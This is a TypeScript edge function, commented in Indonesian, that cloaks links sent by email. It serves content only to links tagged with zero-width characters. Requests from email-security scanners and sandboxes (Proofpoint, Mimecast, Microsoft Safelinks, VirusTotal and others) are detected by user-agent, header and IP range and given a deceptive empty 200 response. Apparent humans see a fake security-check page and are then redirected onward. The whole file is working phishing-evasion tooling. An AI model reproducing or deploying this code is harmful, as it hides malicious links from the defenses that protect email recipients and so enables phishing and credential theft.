import type { Context } from "https://edge.netlify.com";

export default async function handler(req: Request, context: Context): Promise<Response> {
    const url = new URL(req.url);
    const ua = req.headers.get("user-agent") || "Unknown";
    const uaLower = ua.toLowerCase();

    // ✅ Netlify pakai x-nf-client-connection-ip untuk IP asli
    const ip = req.headers.get("x-nf-client-connection-ip")
      || req.headers.get("x-real-ip")
      || req.headers.get("x-forwarded-for")?.split(",")[0]?.trim()
      || context.ip
      || "Unknown";

    const geo = context.geo;
    const country = geo?.country?.code || "Unknown";
    const city = geo?.city || "Unknown";

    // ═══════════════════════════════════════════
    // ═══ NETLIFY GEO + ASN DETECTION ════════════
    // ═══════════════════════════════════════════

    // Blokir negara tertentu jika perlu (opsional, uncomment jika mau)
    // const blockedCountries = ["CN", "RU", "KP", "IR"];
    // if (blockedCountries.includes(country)) {
    //   console.log(`❌ BLOCKED (COUNTRY): IP=${ip} | COUNTRY=${country}`);
    //   return new Response("Error 403: Access Denied", { status: 403 });
    // }

    console.log(`🌍 GEO INFO: IP=${ip} | COUNTRY=${country} | CITY=${city}`);

    // ═══════════════════════════════════════════
    // ═══ STATIC FILES ══════════════════���════════
    // ═══════════════════════════════════════════
    if (/favicon|manifest|\.ico|\.png|robots\.txt/.test(url.pathname)) {
      console.log(`❌ BLOCKED BOT (STATIC): IP=${ip} | UA=${ua}`);
      return new Response(null, { status: 204 });
    }

    // ═══════════════════════════════════════════
    // ═══ VERIFY TOKEN ═══════════════════════════
    // ═══════════════════════════════════════════
    if (url.pathname === "/verify") {
      const token = url.searchParams.get("t");
      const ts = url.searchParams.get("ts");
      const now = Date.now();

      if (token && ts) {
        const elapsed = now - parseInt(ts);
        if (elapsed < 2000) {
          console.log(`❌ BLOCKED BOT (TOO FAST): IP=${ip} | UA=${ua} | TIME=${elapsed}ms`);
          return new Response("Error 403: Access Denied", { status: 403 });
        }
        console.log(`🚀 HUMAN VERIFIED: IP=${ip} | TIME=${elapsed}ms | UA=${ua}`);
        return Response.redirect("https://debounce.com", 302);
      }

      console.log(`❌ BLOCKED BOT (NO TOKEN): IP=${ip} | UA=${ua}`);
      return new Response("Error 403: Access Denied", { status: 403 });
    }

    // ═══════════════════════════════════════════
    // ═══ ZWC CHECK ══════════════════════════════
    // ═══════════════════════════════════════════
    const hasZwc = /[\u200B-\u200D\uFEFF]/.test(decodeURIComponent(url.pathname));
    if (!hasZwc) {
      console.log(`⚠️ NO ZWC (COPIED LINK): IP=${ip} | UA=${ua}`);
      return new Response("404 Not Found", { status: 404 });
    }

    // ═══════════════════════════════════════════
    // ═══ EMAIL SECURITY BOT DETECTION ═══════════
    // ═══════════════════════════════════════════
    const botUA = [
      "vade", "vadesecure", "proofpoint", "pphosted", "cloudmark",
      "barracuda", "mimecast", "fireeye", "trellix", "ironport",
      "sophos", "forcepoint", "websense", "symantec", "messagelabs",
      "fortinet", "fortigate", "fortimail", "trendmicro", "trend micro",
      "spamhaus", "spamexperts", "mailguard", "libraesva",
      "avanan", "abnormal", "bitdefender", "kaspersky", "eset",
      "mcafee", "agari", "area1", "zerospam", "hornetsecurity",
      "trustwave", "mailchannels", "spamtitan",
      "microsoft", "azure", "office", "outlook", "safelinks",
      "googlebot", "google-safety",
      "bot", "crawl", "spider", "slurp",
      "facebookexternalhit", "linkedinbot", "twitterbot",
      "whatsapp", "telegrambot", "discord",
      "curl", "wget", "python", "go-http", "java/", "php/", "ruby",
      "httpclient", "axios", "node-fetch", "undici",
      "headlesschrome", "phantomjs", "selenium", "puppeteer",
      "scanbot", "urlscan", "virustotal",
    ];

    const matchedUA = botUA.find((kw) => uaLower.includes(kw));

    const suspiciousHeaders = [
      "x-ms-useragent", "x-ms-exchange", "x-proofpoint", "x-pp-correlation-id",
      "x-barracuda", "x-mimecast", "x-fireeye", "x-cloudmark", "x-vade",
      "x-ironport", "x-sophos", "x-forcepoint", "x-fortinet", "x-fortimail",
      "x-trendmicro", "x-symantec", "x-messagelabs", "x-mailguard",
      "x-spamhaus", "x-avanan", "x-abnormal", "x-agari",
      "x-hornetsecurity", "x-zerospam", "x-trustwave",
      "x-atp-redirect", "x-safe-url",
    ];

    const matchedHeader = suspiciousHeaders.find((h) => req.headers.has(h));

    const emailSecurityIPs = [
      "67.231.", "148.163.", "208.86.20",
      "78.31.1", "185.132.",
      "208.80.19", "74.63.",
      "207.211.", "205.139.",
      "209.222.", "64.235.",
      "40.92.", "40.93.", "40.94.", "40.107.", "52.100.", "52.101.", "104.47.",
      "66.249.", "72.14.19",
      "198.71.", "184.154.",
    ];

    const matchedIP = emailSecurityIPs.find((prefix) => ip.startsWith(prefix));

    if (matchedUA) {
      console.log(`❌ BLOCKED BOT (UA): IP=${ip} | UA=${ua} | MATCH=${matchedUA}`);
      return new Response("", { status: 200 }); // Fake 200 agar scanner tidak tahu
    }
    if (matchedHeader) {
      console.log(`❌ BLOCKED BOT (HEADER): IP=${ip} | UA=${ua} | HEADER=${matchedHeader}`);
      return new Response("", { status: 200 });
    }
    if (matchedIP) {
      console.log(`❌ BLOCKED BOT (IP-RANGE): IP=${ip} | UA=${ua} | RANGE=${matchedIP}`);
      return new Response("", { status: 200 });
    }

    // ═══════════════════════════════════════════
    // ═══ FINGERPRINT ════════════════════════════
    // ═══════════════════════════════════════════
    const hasAcceptLang = req.headers.has("accept-language");
    const hasAccept = req.headers.get("accept")?.includes("text/html");
    const isMobile = /iphone|ipad|android/.test(uaLower);
    const isDesktop = /windows|macintosh|linux/.test(uaLower);
    const noReferer = !req.headers.has("referer");
    const noCookie = !req.headers.has("cookie");
    const noSecFetch = !req.headers.has("sec-fetch-mode");
    const acceptAll = req.headers.get("accept") === "*/*";
    const behaviorScore =
      (noReferer ? 1 : 0) +
      (noCookie ? 1 : 0) +
      (noSecFetch ? 1 : 0) +
      (acceptAll ? 1 : 0);
    const isBehaviorBot = behaviorScore >= 3 && !req.headers.has("sec-ch-ua");
    const isRealBrowser =
      uaLower.length >= 35 && hasAcceptLang && hasAccept && (isMobile || isDesktop);

    if (!isRealBrowser || isBehaviorBot) {
      const reasons: string[] = [];
      if (uaLower.length < 35) reasons.push("SHORT_UA");
      if (!hasAcceptLang) reasons.push("NO_LANG");
      if (!hasAccept) reasons.push("NO_HTML_ACCEPT");
      if (!isMobile && !isDesktop) reasons.push("NO_PLATFORM");
      if (isBehaviorBot) reasons.push(`BEHAVIOR=${behaviorScore}`);
      console.log(`❌ BLOCKED BOT (FINGERPRINT): IP=${ip} | UA=${ua} | REASON=${reasons.join(",")}`);
      return new Response("", { status: 200 }); // Fake 200
    }

    // ═══════════════════════════════════════════
    // ═══ JS CHALLENGE PAGE ══════════════════════
    // ═══════════════════════════════════════════
    console.log(`⏳ JS CHALLENGE SERVED: IP=${ip} | COUNTRY=${country} | UA=${ua}`);

    const ts = Date.now();
    const challengeHTML = `<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verifying...</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
    background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#fff;border-radius:12px;padding:40px;text-align:center;
    box-shadow:0 2px 10px rgba(0,0,0,.08);max-width:400px;width:90%}
  .spinner{width:40px;height:40px;border:4px solid #e0e0e0;border-top-color:#1a73e8;
    border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
  @keyframes spin{to{transform:rotate(360deg)}}
  h2{color:#202124;font-size:18px;font-weight:500;margin-bottom:8px}
  p{color:#5f6368;font-size:14px}
  .progress{width:100%;height:4px;background:#e0e0e0;border-radius:2px;margin-top:20px;overflow:hidden}
  .bar{height:100%;background:#1a73e8;border-radius:2px;width:0%;transition:width 4s linear}
  .check{display:none;color:#34a853;font-size:32px;margin-bottom:12px}
</style>
</head><body>
<div class="card">
  <div class="spinner" id="spinner"></div>
  <div class="check" id="check">✓</div>
  <h2 id="title">Verifying your connection...</h2>
  <p id="desc">This is an automatic security check</p>
  <div class="progress"><div class="bar" id="bar"></div></div>
</div>
<script>
(function(){
  var ts = ${ts};
  var detected = false;
  setTimeout(function(){ document.getElementById('bar').style.width = '100%'; }, 100);
  ['mousemove','click','touchstart','scroll','keydown'].forEach(function(e){
    document.addEventListener(e, function(){ detected = true; }, {once:true,passive:true});
  });
  setTimeout(function(){
    document.getElementById('spinner').style.display = 'none';
    document.getElementById('check').style.display = 'block';
    document.getElementById('title').textContent = 'Verification complete';
    document.getElementById('desc').textContent = 'Redirecting...';
    var token = btoa(ts + ':verified:' + (detected ? 'human' : 'passive'));
    setTimeout(function(){
      window.location.href = '/verify?t=' + encodeURIComponent(token) + '&ts=' + ts;
    }, 500);
  }, 4000);
  if(navigator.webdriver){ document.body.innerHTML = '<h1>Access Denied</h1>'; }
})();
</script>
</body></html>`;

    return new Response(challengeHTML, {
      status: 200,
      headers: { "Content-Type": "text/html; charset=utf-8" },
    });
}